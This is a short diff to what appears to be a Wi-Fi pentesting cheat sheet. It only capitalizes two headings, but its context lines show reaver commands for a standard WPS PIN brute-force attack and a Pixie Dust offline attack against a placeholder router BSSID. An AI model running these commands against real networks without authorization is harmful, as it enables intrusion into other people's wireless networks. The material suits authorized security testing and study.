@@ -26,12 +26,12 @@ AA:BB:CC:XX:YY:ZZ    1  -88  2.0  No   Broadcom  linksys
 
 ### Attacks to retrieve the pin
 
-#### standard attack
+#### Standard attack
 ```text
 sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv
 ```
 
-#### pixie dust offline attack - (-K 1)
+#### Pixie dust offline attack - (-K 1)
 ```text
 sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -K 1
 ```
